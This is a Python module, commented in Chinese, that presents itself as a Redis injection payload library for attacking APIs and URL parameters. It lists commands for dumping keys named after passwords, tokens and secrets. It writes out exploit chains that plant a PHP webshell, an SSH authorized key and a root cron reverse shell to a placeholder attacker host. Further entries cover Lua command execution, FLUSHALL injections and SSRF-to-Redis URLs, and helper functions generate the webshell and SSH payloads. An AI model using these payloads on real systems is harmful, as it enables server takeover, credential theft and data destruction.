"""
Redis 注入載荷模塊
包含針對Redis的各種注入載荷，用於API和URL參數的漏洞利用
"""

import base64
import json

# Redis命令注入 - 基本命令
BASIC_COMMANDS = [
    {
        "name": "INFO命令",
        "value": "INFO",
        "description": "獲取Redis服務器信息",
        "category": "info"
    },
    {
        "name": "PING測試",
        "value": "PING",
        "description": "基本連接測試",
        "category": "info"
    },
    {
        "name": "查詢所有鍵",
        "value": "KEYS *",
        "description": "列出所有鍵（生產環境謹慎使用）",
        "category": "enum"
    },
    {
        "name": "服務器配置",
        "value": "CONFIG GET *",
        "description": "獲取所有配置參數",
        "category": "config"
    },
    {
        "name": "客戶端列表",
        "value": "CLIENT LIST",
        "description": "查看連接的客戶端",
        "category": "info"
    }
]

# Redis命令注入 - 枚舉數據
ENUMERATION_COMMANDS = [
    {
        "name": "查詢所有鍵",
        "value": "KEYS *",
        "description": "列出所有鍵（生產環境謹慎使用）",
        "category": "enum"
    },
    {
        "name": "查詢session鍵",
        "value": "KEYS session:*",
        "description": "列出所有session開頭的鍵",
        "category": "enum"
    },
    {
        "name": "查詢user鍵",
        "value": "KEYS user:*",
        "description": "列出所有user開頭的鍵",
        "category": "enum"
    },
    {
        "name": "查詢admin鍵",
        "value": "KEYS admin:*",
        "description": "列出所有admin開頭的鍵",
        "category": "enum"
    },
    {
        "name": "查詢token鍵",
        "value": "KEYS *token*",
        "description": "列出所有包含token的鍵",
        "category": "enum"
    },
    {
        "name": "查詢指定類型",
        "value": "SCAN 0 TYPE string COUNT 100",
        "description": "使用SCAN查詢字符串類型的鍵",
        "category": "enum"
    },
    {
        "name": "數據庫大小",
        "value": "DBSIZE",
        "description": "獲取數據庫中鍵的數量",
        "category": "enum"
    }
]

# Redis命令注入 - 數據修改/訪問
DATA_COMMANDS = [
    {
        "name": "獲取字符串值",
        "value": "GET {key}",
        "description": "獲取字符串類型的鍵值",
        "category": "data",
        "requires_key": True
    },
    {
        "name": "獲取哈希字段",
        "value": "HGETALL {key}",
        "description": "獲取哈希類型的所有字段和值",
        "category": "data",
        "requires_key": True
    },
    {
        "name": "獲取列表元素",
        "value": "LRANGE {key} 0 -1",
        "description": "獲取列表類型的所有元素",
        "category": "data",
        "requires_key": True
    },
    {
        "name": "獲取集合元素",
        "value": "SMEMBERS {key}",
        "description": "獲取集合類型的所有元素",
        "category": "data",
        "requires_key": True
    },
    {
        "name": "獲取有序集合",
        "value": "ZRANGE {key} 0 -1 WITHSCORES",
        "description": "獲取有序集合的所有元素和分數",
        "category": "data",
        "requires_key": True
    },
    {
        "name": "寫入字符串值",
        "value": "SET {key} {value}",
        "description": "設置字符串類型的鍵值",
        "category": "write",
        "requires_key": True,
        "requires_value": True
    },
    {
        "name": "刪除鍵",
        "value": "DEL {key}",
        "description": "刪除指定的鍵",
        "category": "write",
        "requires_key": True
    }
]

# Redis命令注入 - 配置修改
CONFIG_COMMANDS = [
    {
        "name": "獲取所有配置",
        "value": "CONFIG GET *",
        "description": "獲取所有配置參數",
        "category": "config"
    },
    {
        "name": "獲取目錄配置",
        "value": "CONFIG GET dir",
        "description": "獲取Redis工作目錄",
        "category": "config"
    },
    {
        "name": "獲取數據庫文件名",
        "value": "CONFIG GET dbfilename",
        "description": "獲取數據庫文件名",
        "category": "config"
    },
    {
        "name": "修改目錄",
        "value": "CONFIG SET dir {directory}",
        "description": "修改Redis工作目錄",
        "category": "config",
        "requires_arg": True
    },
    {
        "name": "修改數據庫文件名",
        "value": "CONFIG SET dbfilename {filename}",
        "description": "修改數據庫文件名",
        "category": "config",
        "requires_arg": True
    },
    {
        "name": "保存配置",
        "value": "CONFIG REWRITE",
        "description": "將運行時配置保存到配置文件",
        "category": "config"
    }
]

# Redis文件訪問/系統利用
SYSTEM_COMMANDS = [
    {
        "name": "保存數據庫",
        "value": "SAVE",
        "description": "保存數據庫到磁盤",
        "category": "system"
    },
    {
        "name": "Redis基本信息",
        "value": "INFO",
        "description": "獲取Redis服務器信息",
        "category": "system"
    },
    {
        "name": "Redis服務器統計",
        "value": "INFO STATS",
        "description": "獲取Redis服務器統計信息",
        "category": "system"
    },
    {
        "name": "獲取系統時間",
        "value": "TIME",
        "description": "獲取Redis服務器時間",
        "category": "system"
    },
    {
        "name": "查看慢日誌",
        "value": "SLOWLOG GET 10",
        "description": "獲取最近10條慢查詢日誌",
        "category": "system"
    }
]

# Redis WebShell/反向殼相關漏洞利用
EXPLOIT_COMMANDS = [
    {
        "name": "Webshell植入(PHP)",
        "value": [
            "CONFIG SET dir /var/www/html/",
            "CONFIG SET dbfilename shell.php",
            "SET payload \"<?php system($_GET['cmd']); ?>\"",
            "SAVE"
        ],
        "description": "嘗試在Web目錄寫入PHP webshell",
        "category": "exploit",
        "target": "php"
    },
    {
        "name": "SSH密鑰植入",
        "value": [
            "CONFIG SET dir /home/redis/.ssh/",
            "CONFIG SET dbfilename authorized_keys",
            "SET payload \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8rHkR5QrjIkUzBwR5TwdH4KNHw+0gdzRnZUEL+dUDsj2U5aB1bL3g9WF2dBonxw57YZ5MbTcjbZwJNE6q1q/H0eJFGF2dSNMj+WQjXPcqKZPIHlTUYyNA+802T1S10hsM+qQ6EGLVrFKjKxG0f62xfsJxZvRrGwk6iIT5RQpFsQQTM+GLZtIADseuQwUuDLnBZ7YLBb5dW/dFmBZrOLxZtKq8QFAEOi1tXdH2XBxhhXbcKjXSZEHHFbvYgC+wdztJrhY8e0U3NOhSURypDpFIYXAR3RyqwJZCR2jXeRLywL7vzcS9QD0rOzH6XD6uJpSBrYrIEIq4h3gADCw7IFkJ test@example.com\"",
            "SAVE"
        ],
        "description": "嘗試在Redis用戶的.ssh目錄寫入SSH密鑰",
        "category": "exploit",
        "target": "ssh"
    },
    {
        "name": "計劃任務植入",
        "value": [
            "CONFIG SET dir /var/spool/cron/crontabs/",
            "CONFIG SET dbfilename root",
            "SET payload \"\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker-ip/9001 0>&1\\n\"",
            "SAVE"
        ],
        "description": "嘗試寫入root的cron計劃任務",
        "category": "exploit",
        "target": "cron"
    },
    {
        "name": "LUA腳本執行",
        "value": "EVAL \"return tostring(io.popen('id'):read('*a'))\" 0",
        "description": "使用Lua腳本執行系統命令",
        "category": "exploit",
        "target": "lua"
    }
]

# Redis URL參數注入
URL_PARAMETER_INJECTIONS = [
    {
        "name": "Protocol Injection",
        "value": "redis://127.0.0.1:6379/info",
        "description": "通過URL協議注入Redis命令",
        "category": "url"
    },
    {
        "name": "URL字段注入",
        "value": "?id=1;FLUSHALL;",
        "description": "嘗試在URL參數中注入Redis命令",
        "category": "url"
    },
    {
        "name": "SSRF轉Redis",
        "value": "redis://127.0.0.1:6379/%0D%0AKEYS%20*%0D%0Ar%0D%0A",
        "description": "通過SSRF漏洞注入Redis命令",
        "category": "url"
    },
    {
        "name": "參數分隔符注入",
        "value": ";FLUSHALL;",
        "description": "使用分隔符在參數中注入命令",
        "category": "url"
    }
]

# Redis JSON注入
JSON_PARAMETER_INJECTIONS = [
    {
        "name": "基本JSON注入",
        "value": "{\"param\": \"redis://127.0.0.1:6379/INFO\"}",
        "description": "在JSON參數中嵌入Redis URL",
        "category": "json"
    },
    {
        "name": "嵌套JSON注入",
        "value": "{\"param\": {\"url\": \"redis://127.0.0.1:6379/INFO\"}}",
        "description": "在嵌套JSON結構中注入Redis URL",
        "category": "json"
    },
    {
        "name": "JSON數組注入",
        "value": "{\"params\": [\"normal\", \"redis://127.0.0.1:6379/KEYS%20*\"]}",
        "description": "在JSON數組中注入Redis URL",
        "category": "json"
    }
]

# 封裝的Redis命令集
def get_reconnaissance_commands():
    """獲取用於偵察的Redis命令"""
    return [
        "INFO",
        "CLIENT LIST",
        "CONFIG GET *",
        "DBSIZE",
        "KEYS *",
        "SCAN 0 COUNT 100"
    ]

def get_data_extraction_commands():
    """獲取用於數據提取的Redis命令"""
    return [
        "KEYS *",
        "KEYS session:*",
        "KEYS user:*",
        "KEYS *token*",
        "KEYS *admin*",
        "KEYS *password*",
        "KEYS *secret*",
        "KEYS *key*"
    ]

def get_webshell_commands(webroot="/var/www/html", filename="shell.php", webshell_code="<?php system($_GET['cmd']); ?>"):
    """
    生成用於植入WebShell的Redis命令
    
    Args:
        webroot (str): Web根目錄
        filename (str): Shell文件名
        webshell_code (str): WebShell代碼
    
    Returns:
        list: Redis命令列表
    """
    return [
        f"CONFIG SET dir {webroot}",
        f"CONFIG SET dbfilename {filename}",
        f"SET payload \"{webshell_code}\"",
        "SAVE"
    ]

def get_ssh_key_injection_commands(ssh_dir="/home/redis/.ssh", ssh_key="ssh-rsa AAAA... user@example.com"):
    """
    生成用於SSH密鑰注入的Redis命令
    
    Args:
        ssh_dir (str): SSH目錄
        ssh_key (str): SSH公鑰
    
    Returns:
        list: Redis命令列表
    """
    return [
        f"CONFIG SET dir {ssh_dir}",
        "CONFIG SET dbfilename authorized_keys",
        f"SET payload \"\\n\\n{ssh_key}\\n\"",
        "SAVE"
    ]

def get_redis_url_payload(command):
    """
    生成Redis URL協議payload
    
    Args:
        command (str): Redis命令
    
    Returns:
        str: 編碼後的Redis URL
    """
    # 使用%0D%0A表示\r\n (CRLF)
    return f"redis://127.0.0.1:6379/%0D%0A{command}%0D%0Ar%0D%0A" 